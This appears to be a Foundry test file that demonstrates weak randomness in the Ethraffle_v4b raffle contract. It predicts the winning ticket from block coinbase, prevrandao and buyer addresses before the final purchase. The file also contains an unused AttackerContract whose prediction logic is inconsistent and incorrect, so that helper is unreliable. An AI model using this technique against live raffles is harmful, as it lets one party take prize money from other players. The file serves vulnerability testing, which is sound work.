
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Ethraffle_v4b} from "../src/Ethraffle_v4b.sol";

contract AttackerContract {
    Ethraffle_v4b public raffle;
    uint256 public predictedWinningTicket;
    
    constructor(Ethraffle_v4b _raffle) {
        raffle = _raffle;
    }
    
    function calculateWinningTicket(address coinbase) external view returns (uint256) {
        uint256 totalTickets = raffle.totalTickets();
        
        address seed1 = address(this);
        address seed2 = address(this);
        uint256 seed3 = block.difficulty;
        
        uint256 coinbaseIndex = uint256(uint160(coinbase)) % totalTickets;
        uint256 senderIndex = uint256(uint160(address(this))) % totalTickets;
        
        if (coinbaseIndex == senderIndex) {
            seed1 = address(this);
            seed2 = address(this);
        }
        
        bytes32 randHash = keccak256(abi.encodePacked(seed1, seed2, seed3));
        uint256 winningNumber = uint256(randHash) % totalTickets;
        
        return winningNumber;
    }
    
    function buyAllTickets() external payable {
        raffle.buyTickets{value: msg.value}();
    }
    
    receive() external payable {}
}

contract TestWeakRandomnessEthraffle_v4b is Test {
    Ethraffle_v4b public _contractUnderTest;
    
    uint256 constant TOTAL_TICKETS = 50;
    uint256 constant PRICE_PER_TICKET = (2.5 ether + 0.03 ether) / 50;
    uint256 constant TOTAL_COST = PRICE_PER_TICKET * TOTAL_TICKETS;

    event RaffleResult(
        uint raffleId,
        uint winningNumber,
        address winningAddress,
        address seed1,
        address seed2,
        uint seed3,
        bytes32 randHash
    );

    function setUp() public {
        _contractUnderTest = new Ethraffle_v4b();
    }

    function test_highlightPredictableRandomValue(uint256 blockPrevrandao, address blockCoinbase) public {
        vm.assume(blockPrevrandao > 0);
        vm.assume(blockCoinbase != address(0));
        
        vm.deal(address(this), TOTAL_COST + 1 ether);
        
        vm.prevrandao(bytes32(blockPrevrandao));
        vm.coinbase(blockCoinbase);
        
        for (uint256 i = 0; i < TOTAL_TICKETS - 1; i++) {
            address buyer = address(uint160(i + 1000));
            vm.deal(buyer, PRICE_PER_TICKET);
            vm.prank(buyer);
            _contractUnderTest.buyTickets{value: PRICE_PER_TICKET}();
        }
        
        address lastBuyer = address(this);
        
        address seed1;
        address seed2;
        {
            uint256 coinbaseIndex = uint256(uint160(blockCoinbase)) % TOTAL_TICKETS;
            uint256 senderIndex = uint256(uint160(lastBuyer)) % TOTAL_TICKETS;
            
            if (coinbaseIndex < TOTAL_TICKETS - 1) {
                seed1 = address(uint160(coinbaseIndex + 1000));
            } else {
                seed1 = lastBuyer;
            }
            
            if (senderIndex < TOTAL_TICKETS - 1) {
                seed2 = address(uint160(senderIndex + 1000));
            } else {
                seed2 = lastBuyer;
            }
        }
        
        uint256 seed3 = blockPrevrandao;
        bytes32 expectedRandHash = keccak256(abi.encodePacked(seed1, seed2, seed3));
        uint256 expectedWinningNumber = uint256(expectedRandHash) % TOTAL_TICKETS;
        
        address expectedWinner;
        if (expectedWinningNumber < TOTAL_TICKETS - 1) {
            expectedWinner = address(uint160(expectedWinningNumber + 1000));
        } else {
            expectedWinner = lastBuyer;
        }
        
        vm.expectEmit(true, true, true, true);
        emit RaffleResult(
            1,
            expectedWinningNumber,
            expectedWinner,
            seed1,
            seed2,
            seed3,
            expectedRandHash
        );
        
        _contractUnderTest.buyTickets{value: PRICE_PER_TICKET}();
        
        assertEq(_contractUnderTest.raffleId(), 2, "Raffle should have completed and incremented");
    }
    
    receive() external payable {}
}
